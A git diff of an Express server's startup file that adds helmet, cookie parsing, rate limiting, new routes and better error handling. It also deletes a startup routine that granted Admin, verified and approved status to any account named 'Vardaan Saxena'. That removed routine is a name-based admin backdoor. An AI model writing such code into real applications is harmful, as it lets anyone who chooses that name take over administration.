@@ -2,13 +2,17 @@ const express = require('express');
 const dotenv = require('dotenv');
 dotenv.config();
 
+const cookieParser = require('cookie-parser');
 const cors = require('cors');
+const helmet = require('helmet');
 const { connectDB, getDbHealth } = require('./config/db');
+const { initYearPromotionCron } = require('./jobs/yearPromotion');
 const { env, validateEnv } = require('./config/env');
-const { securityHeaders } = require('./middleware/securityMiddleware');
+const { securityHeaders, globalLimiter } = require('./middleware/securityMiddleware');
 const { requestId, requestLogger } = require('./middleware/observabilityMiddleware');
 const logger = require('./utils/logger');
 const User = require('./models/User');
+const AppError = require('./utils/AppError');
 const envValidation = validateEnv({ throwOnError: false });
 if (!envValidation.ok) {
   logger.error('env_validation_failed', { errors: envValidation.errors });
@@ -72,13 +76,17 @@ const createApp = () => {
   };
 
   app.use(requestId);
+  app.use(cookieParser());
   app.use(cors(corsOptions));
   app.use(securityHeaders);
+  app.use(helmet());
   app.use(requestLogger);
 
   const bodyLimit = `${env.app.requestBodyLimitKb}kb`;
   app.use(express.json({ limit: bodyLimit }));
   app.use(express.urlencoded({ extended: true, limit: bodyLimit }));
+  
+  app.use('/api', globalLimiter);
 
   app.use((req, res, next) => {
     requestMetrics.total += 1;
@@ -156,20 +164,36 @@ const createApp = () => {
   app.use('/api/hierarchy', require('./routes/hierarchyRoutes'));
   app.use('/api/learning', require('./routes/learningRoutes'));
   app.use('/api/programs', require('./routes/programRoutes'));
+  app.use('/api/recruitment', require('./routes/recruitmentRoutes'));
+  app.use('/api/inquiries', require('./routes/inquiryRoutes'));
+  app.use('/api/search', require('./routes/searchRoutes'));
 
   app.use((err, req, res, _next) => {
-    const statusCode = res.statusCode === 200 ? 500 : res.statusCode;
+    let statusCode = res.statusCode === 200 ? 500 : res.statusCode;
+    let message = err.message;
+
+    if (err instanceof AppError) {
+      statusCode = err.statusCode;
+    } else if (err.name === 'ValidationError') {
+      statusCode = 400;
+      message = Object.values(err.errors).map(val => val.message).join(', ');
+    } else if (err.name === 'CastError') {
+      statusCode = 400;
+      message = `Invalid ${err.path}: ${err.value}`;
+    }
+
     logger.error('request_failed', {
       requestId: req.requestId,
       method: req.method,
       path: req.originalUrl,
       statusCode,
-      message: err.message,
+      message,
       stack: env.nodeEnv === 'production' ? undefined : err.stack,
     });
+
     res.status(statusCode).json({
       requestId: req.requestId,
-      message: err.message,
+      message,
       stack: env.nodeEnv === 'production' ? null : err.stack,
     });
   });
@@ -177,37 +201,13 @@ const createApp = () => {
   return app;
 };
 
-const ensureNamedAdmin = async () => {
-  try {
-    const result = await User.updateMany(
-      { name: { $regex: /^\s*vardaan\s+saxena\s*$/i } },
-      { $set: { role: 'Admin', isVerified: true, approvalStatus: 'Approved' } }
-    );
-
-    const matched = Number(result?.matchedCount || 0);
-    const modified = Number(result?.modifiedCount || 0);
-    if (matched > 0) {
-      logger.info('named_admin_enforced', {
-        name: 'Vardaan Saxena',
-        matched,
-        modified,
-      });
-    }
-  } catch (error) {
-    logger.warn('named_admin_enforce_failed', {
-      name: 'Vardaan Saxena',
-      error: error.message,
-    });
-  }
-};
-
 const startServer = async () => {
   if (!envValidation.ok) {
     throw new Error(`Environment validation failed: ${envValidation.errors.join(' ')}`);
   }
   await connectDB();
-  await ensureNamedAdmin();
   const app = createApp();
+  initYearPromotionCron();
   const server = app.listen(env.port, () => {
     logger.info('server_started', {
       port: env.port,
